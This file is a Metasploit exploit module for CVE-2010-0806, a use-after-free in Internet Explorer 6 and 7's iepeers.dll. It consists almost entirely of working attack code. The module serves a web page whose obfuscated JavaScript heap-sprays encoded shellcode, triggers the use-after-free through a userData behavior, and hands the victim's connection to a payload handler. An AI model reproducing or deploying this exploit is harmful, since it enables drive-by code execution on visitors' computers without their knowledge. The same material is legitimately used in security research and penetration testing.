Microsoft Internet Explorer iepeers.dll use-after-free exploit (meta)
=====================================================================

##
# ie_iepeers_pointer.rb
#
# Microsoft Internet Explorer iepeers.dll use-after-free exploit for the Metasploit Framework
#
# Tested successfully on the following platforms:
#  - Microsoft Internet Explorer 7, Windows Vista SP2
#  - Microsoft Internet Explorer 7, Windows XP SP3
#  - Microsoft Internet Explorer 6, Windows XP SP3
#
# Exploit found in-the-wild. For additional details:
# http://www.rec-sec.com/2010/03/10/internet-explorer-iepeers-use-after-free-exploit/
#
# Trancer
# http://www.rec-sec.com
##

require &#039;msf/core&#039;

class Metasploit3 < Msf::Exploit::Remote
	Rank = GoodRanking

	include Msf::Exploit::Remote::HttpServer::HTML

	def initialize(info = {})
		super(update_info(info,
			&#039;Name&#039;           => &#039;Microsoft Internet Explorer iepeers.dll use-after-free&#039;,
			&#039;Description&#039;    => %q{
				This module exploits a use-after-free vulnerability within iepeers.dll of 
				Microsoft Internet Explorer versions 6 and 7.
				
				NOTE: Internet Explorer 8 and Internet Explorer 5 are not affected.
			},
			&#039;License&#039;        => MSF_LICENSE,
			&#039;Author&#039;         => [ 
						&#039;Trancer <mtrancer[at]gmail.com>&#039;
						], 
			&#039;Version&#039;        => &#039;$Revision:$&#039;,
			&#039;References&#039;     => 
				[
					[ &#039;CVE&#039;, &#039;2010-0806&#039; ],
					[ &#039;URL&#039;, &#039;http://www.microsoft.com/technet/security/advisory/981374.mspx&#039; ],
				],
			&#039;DefaultOptions&#039; =>
				{
					&#039;EXITFUNC&#039; => &#039;process&#039;,
				},
			&#039;Payload&#039;        =>
				{
					&#039;Space&#039;         => 1024,
					&#039;BadChars&#039;      => "\x00\x09\x0a\x0d&#039;\\",	
					&#039;StackAdjustment&#039; => -3500,
				},
			&#039;Platform&#039;       => &#039;win&#039;,
			&#039;Targets&#039;        =>
				[
					[ &#039;Windows XP SP0-SP3 / IE 6.0 SP0-2 & IE 7.0&#039;, { &#039;Ret&#039; => 0x0C0C0C0C } ]	
				],
			&#039;DisclosureDate&#039; => &#039;Mar 09 2010&#039;,
			&#039;DefaultTarget&#039;  => 0))
	end

	def on_request_uri(cli, request)
		
		# Re-generate the payload
		return if ((p = regenerate_payload(cli)) == nil)

		# Encode the shellcode
		shellcode = Rex::Text.to_unescape(payload.encoded, Rex::Arch.endian(target.arch))

		# Set the return\nops
		ret  	  = Rex::Text.to_unescape([target.ret].pack(&#039;V&#039;))

		# Randomize the javascript variable names
 		j_shellcode	 = rand_text_alpha(rand(100) + 1)
		j_nops		 = rand_text_alpha(rand(100) + 1)
		j_slackspace = rand_text_alpha(rand(100) + 1)
		j_fillblock	 = rand_text_alpha(rand(100) + 1)
		j_memory	 = rand_text_alpha(rand(100) + 1)
		j_counter	 = rand_text_alpha(rand(30) + 2)
		j_ret		 = rand_text_alpha(rand(100) + 1)
		j_array		 = rand_text_alpha(rand(100) + 1)
		j_function1	 = rand_text_alpha(rand(100) + 1)
		j_function2	 = rand_text_alpha(rand(100) + 1)
		j_object	 = rand_text_alpha(rand(100) + 1)
		j_id		 = rand_text_alpha(rand(100) + 1)

		# Build out the message
		html = %Q|<html><body>
<button id=&#039;#{j_id}&#039; onclick=&#039;#{j_function2}();&#039; style=&#039;display:none&#039;></button>
<script language=&#039;javascript&#039;>
function #{j_function1}(){
	var #{j_shellcode} = unescape(&#039;#{shellcode}&#039;);
	#{j_memory} = new Array(); 
	var #{j_slackspace} = 0x86000-(#{j_shellcode}.length*2); 
	var #{j_nops} = unescape(&#039;#{ret}&#039;); 
	while(#{j_nops}.length<#{j_slackspace}/2) { #{j_nops}+=#{j_nops}; } 
	var #{j_fillblock} = #{j_nops}.substring(0,#{j_slackspace}/2); 
	delete #{j_nops}; 
	for(#{j_counter}=0; #{j_counter}<270; #{j_counter}++) { 
		#{j_memory}[#{j_counter}] = #{j_fillblock} + #{j_fillblock} + #{j_shellcode}; 
	}
}
function #{j_function2}(){
	#{j_function1}();    
	var #{j_object} = document.createElement(&#039;body&#039;);
	#{j_object}.addBehavior(&#039;#default#userData&#039;);
	document.appendChild(#{j_object});
	try {
		for (#{j_counter}=0; #{j_counter}<10; #{j_counter}++) { 
			#{j_object}.setAttribute(&#039;s&#039;,window);
		}
	} catch(e){ }    
	window.status+=&#039;&#039;;
}

document.getElementById(&#039;#{j_id}&#039;).onclick();
</script></body></html>|

		print_status("Sending #{self.name} to #{cli.peerhost}:#{cli.peerport}...")

		send_response(cli, html, { &#039;Content-Type&#039; => &#039;text/html&#039; })
		
		# Handle the payload
		handler(cli)

	end

end



